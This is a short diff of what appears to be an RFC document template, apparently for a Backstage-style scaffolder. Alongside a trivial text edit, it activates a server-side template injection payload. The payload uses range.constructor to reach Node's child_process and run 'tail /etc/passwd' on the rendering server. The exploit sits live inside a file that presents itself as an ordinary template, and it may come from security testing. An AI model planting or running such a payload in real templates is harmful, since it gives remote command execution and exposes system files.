@@ -1,6 +1,6 @@
 # RFC-${{ values.rfcNumber }} - ${{ values.rfcTitle }}
 
-HELLO??
+HELLO??update
 
 *Author(s)*: 
 *Squad*: 
@@ -10,7 +10,7 @@ HELLO??
 
 values: ${{ values }}
 
-{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
+${{ range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")() }}
 
 ## Abstract
 ${{ values.abstract }}
